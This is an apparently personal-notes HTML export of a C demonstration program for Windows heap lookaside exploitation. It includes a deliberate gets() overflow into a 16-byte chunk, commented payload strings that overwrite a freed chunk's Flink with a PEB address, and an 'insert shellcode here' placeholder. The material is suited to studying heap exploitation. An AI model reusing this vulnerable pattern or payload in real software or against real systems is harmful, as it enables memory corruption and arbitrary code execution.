<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>heap-lookaside.c</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">heap-lookaside.c</h1><br/><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">/*<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Overwriting&nbsp;a&nbsp;chunk&nbsp;on&nbsp;the&nbsp;lookaside&nbsp;example<br />*/</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;windows.h&gt;</span><br /><span style="color:#7f0044;font-weight:400">int</span>&nbsp;main(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;argc,<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*argv[])<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*a,*b,*c;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">long</span>&nbsp;*hHeap;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[<span style="color:#ff0044;font-weight:400">10</span>];<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"----------------------------\n"</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"Overwrite&nbsp;a&nbsp;chunk&nbsp;on&nbsp;the&nbsp;lookaside\n"</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"Heap&nbsp;demonstration\n"</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"----------------------------\n"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;create&nbsp;the&nbsp;heap</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hHeap&nbsp;=&nbsp;HeapCreate(<span style="color:#ff0044;font-weight:400">0x00040000</span>,<span style="color:#ff0044;font-weight:400">0</span>,<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"\n(+)&nbsp;Creating&nbsp;a&nbsp;heap&nbsp;at:&nbsp;0x00%xh\n"</span>,hHeap);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"(+)&nbsp;Allocating&nbsp;chunk&nbsp;A\n"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;allocate&nbsp;the&nbsp;first&nbsp;chunk&nbsp;of&nbsp;size&nbsp;N&nbsp;(&lt;0x3F8&nbsp;bytes)</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;=&nbsp;HeapAlloc(hHeap,HEAP_ZERO_MEMORY,<span style="color:#ff0044;font-weight:400">0x10</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"(+)&nbsp;Allocating&nbsp;chunk&nbsp;B\n"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;allocate&nbsp;the&nbsp;second&nbsp;chunk&nbsp;of&nbsp;size&nbsp;N&nbsp;(&lt;0x3F8&nbsp;bytes)</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;=&nbsp;HeapAlloc(hHeap,HEAP_ZERO_MEMORY,<span style="color:#ff0044;font-weight:400">0x10</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"(+)&nbsp;Chunk&nbsp;A=0x00%x\n(+)&nbsp;Chunk&nbsp;B=0x00%x\n"</span>,a,b);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"(+)&nbsp;Freeing&nbsp;chunk&nbsp;B&nbsp;to&nbsp;the&nbsp;lookaside\n"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;Freeing&nbsp;of&nbsp;chunk&nbsp;B:&nbsp;the&nbsp;chunk&nbsp;gets&nbsp;referenced&nbsp;to&nbsp;the&nbsp;lookaside&nbsp;list</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HeapFree(hHeap,<span style="color:#ff0044;font-weight:400">0</span>,b);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;set&nbsp;software&nbsp;bp</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_asm(<span style="color:#3ad900;font-weight:400">"int&nbsp;$0x3"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"(+)&nbsp;Now&nbsp;overflow&nbsp;chunk&nbsp;A:\n"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;The&nbsp;overflow&nbsp;occurs&nbsp;in&nbsp;chunk&nbsp;A:&nbsp;we&nbsp;can&nbsp;manipulate&nbsp;chunk&nbsp;B's&nbsp;Flink</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;PEB&nbsp;lock&nbsp;routine&nbsp;for&nbsp;testing&nbsp;purposes</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;16&nbsp;bytes&nbsp;for&nbsp;size,&nbsp;8&nbsp;bytes&nbsp;for&nbsp;header&nbsp;and&nbsp;4&nbsp;bytes&nbsp;for&nbsp;the&nbsp;flink</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;strcpy(a,"XXXXXXXXXXXXXXXXAAAABBBB\x20\xf0\xfd\x7f");</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;strcpy(a,"XXXXXXXXXXXXXXXXAAAABBBBDDDD");</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gets(a);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;set&nbsp;software&nbsp;bp</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_asm(<span style="color:#3ad900;font-weight:400">"int&nbsp;$0x3"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"(+)&nbsp;Allocating&nbsp;chunk&nbsp;B\n"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;A&nbsp;chunk&nbsp;of&nbsp;block&nbsp;size&nbsp;N&nbsp;is&nbsp;allocated&nbsp;(C).&nbsp;Our&nbsp;fake&nbsp;pointer&nbsp;is&nbsp;returned</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;from&nbsp;the&nbsp;lookaside&nbsp;list.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;=&nbsp;HeapAlloc(hHeap,HEAP_ZERO_MEMORY,<span style="color:#ff0044;font-weight:400">0x10</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"(+)&nbsp;Allocating&nbsp;chunk&nbsp;C\n"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;set&nbsp;software&nbsp;bp</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_asm(<span style="color:#3ad900;font-weight:400">"int&nbsp;$0x3"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;A&nbsp;second&nbsp;chunk&nbsp;of&nbsp;size&nbsp;N&nbsp;is&nbsp;allocated:&nbsp;our&nbsp;fake&nbsp;pointer&nbsp;is&nbsp;returned</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;HeapAlloc(hHeap,HEAP_ZERO_MEMORY,<span style="color:#ff0044;font-weight:400">0x10</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"(+)&nbsp;Chunk&nbsp;A=0x00%x\n(+)Chunk&nbsp;B=0x00%x\n(+)&nbsp;Chunk&nbsp;C=0x00%x\n"</span>,a,b,c);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;A&nbsp;copy&nbsp;operation&nbsp;from&nbsp;a&nbsp;controlled&nbsp;input&nbsp;to&nbsp;this&nbsp;buffer&nbsp;occurs:&nbsp;these</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;bytes&nbsp;are&nbsp;written&nbsp;to&nbsp;our&nbsp;chosen&nbsp;location</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;insert&nbsp;shellcode&nbsp;here</span><br />&nbsp;&nbsp;&nbsp;&nbsp;gets(c);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;set&nbsp;software&nbsp;bp</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_asm(<span style="color:#3ad900;font-weight:400">"int&nbsp;$0x3"</span>);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;}<br /></div></div></div></body></html>